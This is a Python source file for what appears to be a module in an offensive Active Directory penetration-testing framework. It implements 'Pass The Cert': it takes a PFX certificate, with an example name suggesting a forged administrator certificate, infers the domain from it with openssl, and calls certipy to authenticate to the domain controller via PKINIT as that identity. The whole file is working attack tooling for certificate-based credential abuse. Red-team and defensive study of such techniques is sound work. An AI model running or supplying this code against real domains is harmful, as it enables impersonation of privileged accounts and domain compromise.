import os
import re
import shlex
from pathlib import Path

from module import BaseModule
from tool import Tool


class ADCSPassTheCert(BaseModule):
    name = "ADCS - Pass The Cert"
    path = "adcs/ptc"
    description = "Pass The Cert - Authenticate with an existing PFX certificate"
    info = """Pass The Cert uses an existing certificate (PFX) to authenticate with AD CS/PKINIT.

Prerequisites:
  - A valid PFX certificate is already present in logs/.
  - The operator knows the certificate password (if set).
  - Domain/DC routing options are set correctly."""

    options = {
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "cert_name": {"default": "", "description": "PFX certificate filename in logs/ (for example: forged_admin.pfx)", "required": True},
        "cert_password": {"default": "", "description": "PFX certificate password", "required": False},
        "domain": {"default": "", "description": "Domain name (FQDN). Extracted from the certificate if omitted.", "required": False},
        "username": {
            "default": "",
            "description": "Optional username to authenticate as. Extracted from the certificate if omitted.",
            "required": False,
        },
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def _extract_domain_from_pfx(self, cert_path: Path, cert_password: str) -> str:
        passin = f"pass:{str(cert_password or '')}"
        command = (
            f"openssl pkcs12 -in {shlex.quote(str(cert_path))} -clcerts -nokeys "
            f"-passin {shlex.quote(passin)} 2>/dev/null | "
            "openssl x509 -noout -ext subjectAltName -subject 2>/dev/null"
        )
        output = await self.get_command_output(command)
        if not output:
            return ""

        upn_match = re.search(r"UPN::([^,\s]+)", output, re.IGNORECASE)
        if upn_match:
            upn = upn_match.group(1).strip().strip("'\"")
            if "@" in upn:
                return upn.split("@", 1)[1].strip()

        dc_parts = re.findall(r"DC\s*=\s*([^,\/]+)", output, re.IGNORECASE)
        if dc_parts:
            return ".".join(part.strip() for part in dc_parts if part.strip())

        return ""

    async def run(self):
        if not self.validate_options():
            return

        cert_name = self.opts.cert_name.strip()
        if not cert_name:
            self.pane_a.write("[red][!] Option `cert_name` cannot be empty.[/red]")
            return

        os.chdir(self.logs_dir)
        cert_path = Path(cert_name)
        if not cert_path.is_absolute():
            cert_path = Path(self.logs_dir) / cert_path
        cert_path = cert_path.resolve()

        logs_root = Path(self.logs_dir).resolve()
        if logs_root not in cert_path.parents and cert_path != logs_root:
            self.pane_a.write("[red][!] Option `cert_name` must point to a file inside logs/.[/red]")
            return

        if cert_path.suffix.lower() != ".pfx":
            self.pane_a.write("[red][!] Option `cert_name` must be a .pfx file.[/red]")
            return

        if not cert_path.exists():
            self.pane_a.write(f"[red][!] Certificate not found: {cert_path}[/red]")
            return

        tool = Tool(self)
        auth_params = ["-no-save"]

        domain = self.opts.domain.strip().strip("'\"")
        dc_ip = str(getattr(self.opts, "dc_ip", "") or "").strip().strip("'\"")
        if not domain and not dc_ip:
            inferred_domain = await self._extract_domain_from_pfx(
                cert_path, self.opts.cert_password
            )
            if inferred_domain:
                domain = inferred_domain
                self.opts.domain = inferred_domain
                resolved_dc_ip = self.adutils.get_dc_ip("", inferred_domain)
                if resolved_dc_ip:
                    self.opts.dc_ip = resolved_dc_ip
                    self.pane_b.write(
                        f"[cyan][*] Inferred domain `{inferred_domain}` from certificate and resolved DC IP `{resolved_dc_ip}`.[/cyan]"
                    )

        if domain:
            auth_params.extend(["-domain", domain])

        username = self.opts.username.strip().strip("'\"")
        if username:
            auth_params.extend(["-username", username])

        if self.opts.cert_password:
            auth_params.extend(["-password", self.opts.cert_password])

        tool.title("Authenticate using the selected certificate (Pass The Cert)")
        if not await tool.certipy_auth(str(cert_path), auth_params):
            return

        self.pane_b.write("[bold green][*] Pass The Cert authentication successful.[/bold green]")
